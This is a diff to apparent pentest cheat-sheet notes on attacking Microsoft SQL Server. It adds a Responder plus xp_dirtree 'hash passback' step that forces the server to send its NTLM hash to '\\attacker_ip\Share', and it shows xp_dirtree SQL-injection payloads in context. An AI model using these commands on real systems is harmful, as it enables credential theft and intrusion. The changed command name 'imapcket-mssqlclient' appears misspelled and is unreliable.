@@ -7,10 +7,10 @@
 Be careful, you can **block accounts** if you fail login several times using an existing username.
 
 ## Impacket smb related scripts
-If you have credentials:
+[[Impacket-Cheatsheet]]; if you have credentials:
 ```bash
 # connect to a Microsoft SQL server
-mssqlclient.py -port $PORT $domain/$sql_svc 
+imapcket-mssqlclient -port $PORT $domain/$sql_svc 
 ```
 
 ```sql
@@ -44,6 +44,13 @@ declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test'; EXEC xp_dirtree @q
 Or
 ```sql
 declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test';exec master.dbo.xp_dirtree @q;--+
+```
+
+## Hash Passback
+Use [[Responder-Cheatsheet]] to catch the service hash of user 
+```bash
+sudo responder -I $interface
+xp_dirtree "\\attacker_ip\Share"
 ```
 
 ## References
